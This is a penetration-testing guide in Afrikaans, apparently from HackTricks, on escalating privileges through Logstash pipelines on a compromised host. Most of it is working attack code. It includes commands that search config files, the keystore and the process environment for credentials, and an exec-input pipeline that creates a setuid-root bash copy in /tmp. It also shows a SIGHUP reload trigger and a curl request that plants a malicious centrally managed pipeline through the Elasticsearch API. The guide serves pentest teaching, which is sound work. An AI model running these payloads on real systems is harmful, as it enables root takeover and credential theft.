# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs te versamel, te transformeer en te stuur** deur 'n stelsel bekend as **pipelines**. Hierdie pipelines bestaan uit **input**, **filter**, en **output** fases. 'n Interessante aspek ontstaan wanneer Logstash op 'n gekompromitteerde masjien loop.

### Pipeline-konfigurasie

Pipelines word gekonfigureer in die lêer **/etc/logstash/pipelines.yml**, wat die liggings van die pipeline-konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer openbaar waar die **.conf** files, wat pipeline-konfigurasies bevat, geleë is. Wanneer ’n **Elasticsearch output module** gebruik word, is dit algemeen dat **pipelines** **Elasticsearch credentials** insluit, wat dikwels uitgebreide bevoegdhede het as gevolg van Logstash se nodigheid om data na Elasticsearch te skryf. Wildcards in konfigurasiepad maak dit vir Logstash moontlik om alle ooreenstemmende pipelines in die aangewese gids uit te voer.

As Logstash met `-f <directory>` begin word in plaas van `pipelines.yml`, **word alle lêers binne daardie gids in leksikografiese volgorde aaneengeskakel en as ’n enkele konfigurasie geparse**. Dit skep 2 offensiewe implikasies:

- ’n geplaatste lêer soos `000-input.conf` of `zzz-output.conf` kan verander hoe die finale pipeline saamgestel word
- ’n slegte/vormfoutige lêer kan verhoed dat die hele pipeline laai, so valideer payloads noukeurig voordat jy op auto-reload staatmaak

### Vinnige enumerasie op ’n gekompromitteerde gasheer

Op ’n masjien waarop Logstash geïnstalleer is, ondersoek vinnig:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Kontroleer ook of die lokale moniterings-API bereikbaar is. Standaard bind dit op **127.0.0.1:9600**, wat gewoonlik genoeg is nadat jy op die host geland het:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dit gee gewoonlik vir jou pipeline IDs, runtime besonderhede, en bevestiging dat jou gemodifiseerde pipeline gelaai is.

Credentials wat uit Logstash verkry word ontgrendel gewoonlik **Elasticsearch**, kyk dus na [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Om privilege escalation te probeer, identifiseer eers die gebruiker waaronder die Logstash-diens loop, tipies die **logstash** gebruiker. Maak seker jy voldoen aan **een** van hierdie kriteria:

- Besit **write access** tot 'n pipeline **.conf** file **of**
- Die **/etc/logstash/pipelines.yml** lêer gebruik 'n wildcard, en jy kan na die teikenmap skryf

Daarbenewens moet **een** van hierdie voorwaardes voldaan wees:

- Vermoë om die Logstash-diens te herbegin **of**
- Die **/etc/logstash/logstash.yml** lêer het **config.reload.automatic: true** ingestel

Gegewe 'n wildcard in die konfigurasie, sal die skep van 'n lêer wat by hierdie wildcard pas, opdraguitvoering moontlik maak. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bepaal **interval** die uitvoerfrekwensie in sekondes. In die gegewe voorbeeld word die **whoami**-opdrag elke 120 sekondes uitgevoer, met sy uitvoer na **/tmp/output.log** gerig.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml** sal Logstash nuwe of gewysigde pipeline-konfigurasies outomaties opspoor en toepas sonder 'n herstart. As daar geen wildcard is nie, kan nog steeds wysigings aan bestaande konfigurasies gemaak word, maar versigtigheid word aangeraai om ontwrigting te voorkom.

### Meer betroubare Pipeline Payloads

Die `exec` input plugin werk steeds in huidige releases en vereis óf 'n `interval` óf 'n `schedule`. Dit word uitgevoer deur die Logstash JVM te **forking**, dus as geheue beperk is kan jou payload met `ENOMEM` misluk in plaas daarvan om stilweg te loop.

'n Meer praktiese privilege-escalation payload is gewoonlik een wat 'n duursame artefak agterlaat:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
As jy nie die regte het om te herbegin nie, maar jy die proses kan sein, ondersteun Logstash ook 'n **SIGHUP**-geaktiveerde herlaai op Unix-agtige stelsels:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Wees bewus dat nie elke plugin herlaaivriendelik is nie. Byvoorbeeld, die **stdin** input verhoed outomatiese herlaai, so moenie aanneem dat `config.reload.automatic` altyd jou veranderinge sal oppik nie.

### Sekrete steel uit Logstash

Voordat jy slegs op kode-uitvoering fokus, oes die data waartoe Logstash reeds toegang het:

- Kredensiële inligting in platte teks word dikwels hardcoded binne `elasticsearch {}` outputs, `http_poller`, JDBC inputs, of wolkverwante instellings
- Beveiligde instellings mag in **`/etc/logstash/logstash.keystore`** of 'n ander `path.settings`-gids wees
- Die keystore-wagwoord word dikwels voorsien via **`LOGSTASH_KEYSTORE_PASS`**, en pakketgebaseerde installasies haal dit gewoonlik uit **`/etc/sysconfig/logstash`**
- Omgewingsveranderlike-uitbreiding met `${VAR}` word by Logstash-opstart opgelos, dus is die diens se omgewing die moeite werd om te ondersoek

Nuttige kontroles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dit is ook die moeite werd om te kontroleer omdat **CVE-2023-46672** getoon het dat Logstash onder sekere omstandighede sensitiewe inligting in logs kon opteken. Op 'n post-exploitation host kan ou Logstash-logs en `journald`-inskrywings dus inlogbewyse openbaar, selfs al verwys die huidige konfigurasie na die keystore in plaas daarvan om geheime in-line te stoor.

### Misbruik van Gesentraliseerde Pipelinebestuur

In sommige omgewings vertrou die host glad nie op plaaslike `.conf`-lêers nie. As **`xpack.management.enabled: true`** gekonfigureer is, kan Logstash gesentraliseerd bestuurde pipelines van Elasticsearch/Kibana haal, en nadat hierdie modus aangeskakel is, is plaaslike pipeline-configs nie meer die bron van waarheid nie.

Dit beteken 'n ander aanvalspad:

1. Herkry Elastic inlogbewyse vanaf plaaslike Logstash-instellings, die keystore, of logs
2. Verifieer of die rekening die **`manage_logstash_pipelines`** cluster-privilegie het
3. Skep of vervang 'n sentraal bestuurde pipeline sodat die Logstash host jou payload by sy volgende poll-interval uitvoer

Die Elasticsearch API wat vir hierdie funksie gebruik word is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dit is veral nuttig wanneer plaaslike lêers skryfbeskermd is, maar Logstash reeds geregistreer is om pipelines op afstand te haal.

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
